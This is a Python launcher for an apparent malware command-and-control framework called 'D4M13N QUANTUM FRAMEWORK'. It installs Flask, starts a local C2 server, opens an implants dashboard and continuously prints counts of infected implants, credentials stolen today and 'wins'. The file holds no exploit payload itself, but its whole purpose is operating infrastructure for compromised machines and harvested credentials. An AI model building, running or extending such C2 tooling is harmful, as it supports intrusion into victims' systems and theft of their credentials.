#!/usr/bin/env python3
import subprocess
import sys
import time
import requests
import webbrowser
from threading import Thread

def check_dependencies():
    required = ['flask', 'flask-cors']
    missing = []
    
    for package in required:
        try:
            __import__(package.replace('-', '_'))
        except ImportError:
            missing.append(package)
    
    return missing

def install_dependencies():
    print("🔧 INSTALLING DEPENDENCIES...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "flask", "flask-cors", "websockets"])

def start_c2_server():
    print("🚀 STARTING C2 SERVER...")
    try:
        server_process = subprocess.Popen([sys.executable, "c2_server.py"])
        time.sleep(3)
        
        # Test server
        response = requests.get("http://localhost:5000/", timeout=5)
        if response.status_code == 200:
            print("✅ C2 SERVER RUNNING: http://localhost:5000")
            return server_process, True
        else:
            print("❌ SERVER FAILED TO START")
            return None, False
    except Exception as e:
        print(f"❌ SERVER ERROR: {e}")
        return None, False

def start_web_interface():
    print("🌐 LAUNCHING WEB INTERFACE...")
    time.sleep(2)
    webbrowser.open('http://localhost:5000')
    
    # Also open the dashboard
    webbrowser.open('http://localhost:5000/dashboard/implants')

def monitor_system():
    print("📊 STARTING SYSTEM MONITOR...")
    while True:
        try:
            stats = requests.get("http://localhost:5000/dashboard/stats").json()
            if 'error' not in stats:
                print(f"\r📡 IMPLANTS: {stats['implant_count']} | CREDS: {stats['creds_today']} | WINS: {stats['wins_today']} | UPTIME: {stats['uptime']}s", end='')
            time.sleep(5)
        except:
            print("\r❌ C2 SERVER OFFLINE - Restarting...")
            time.sleep(10)

def main():
    print("""
    ╔═══════════════════════════════════════════════╗
    ║           D4M13N QUANTUM FRAMEWORK            ║
    ║              FULL DEPLOYMENT                  ║
    ╚═══════════════════════════════════════════════╝
    """)
    
    # Check dependencies
    missing = check_dependencies()
    if missing:
        print(f"❌ MISSING: {', '.join(missing)}")
        install_dependencies()
    
    # Start C2 server
    server_process, success = start_c2_server()
    if not success:
        print("💀 DEPLOYMENT FAILED!")
        return
    
    # Start web interface
    Thread(target=start_web_interface, daemon=True).start()
    
    # Start monitoring
    try:
        monitor_system()
    except KeyboardInterrupt:
        print("\n\n🛑 SHUTTING DOWN...")
        if server_process:
            server_process.terminate()

if __name__ == '__main__':
    main()